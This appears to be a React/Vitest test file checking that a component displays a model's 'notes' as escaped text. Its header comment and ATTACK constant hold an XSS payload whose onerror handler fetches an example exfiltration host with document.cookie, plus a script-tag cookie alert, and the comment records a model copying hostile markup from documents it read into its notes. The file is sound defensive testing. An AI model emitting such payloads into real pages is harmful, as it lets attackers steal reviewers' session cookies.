// The model's `notes` are untrusted: the model reads hostile documents and can copy their markup into its answer.
// dev_013 contains `<img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">`, and in our recorded
// runs Opus put a literal <img> tag into `notes`. Rendered as raw HTML, such a tag runs script in the reviewer's
// browser (stored XSS). The notes must be shown as text.
import { renderToStaticMarkup } from "react-dom/server";
import { expect, test } from "vitest";

import { NotesCallout } from "./NotesCallout";

const ATTACK = `Remarks: Deliver to Gate 2 <img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">`;

test("markup in the model's notes is shown as text, never rendered as HTML", () => {
  const html = renderToStaticMarkup(<NotesCallout notes={ATTACK} />);
  expect(html).not.toContain("<img");
  expect(html).not.toMatch(/<script/i);
  expect(html).toContain("&lt;img src=x onerror=");
});

test("a script tag in the notes is shown as text", () => {
  const html = renderToStaticMarkup(<NotesCallout notes={"<script>alert(document.cookie)</script>"} />);
  expect(html).not.toMatch(/<script/i);
  expect(html).toContain("&lt;script&gt;");
});

test("ordinary notes still appear, line breaks kept", () => {
  const html = renderToStaticMarkup(<NotesCallout notes={"Total checked.\nRound-off -0.40."} />);
  expect(html).toContain("Total checked.\nRound-off -0.40.");
});

test("no notes, nothing rendered", () => {
  expect(renderToStaticMarkup(<NotesCallout notes={null} />)).toBe("");
});
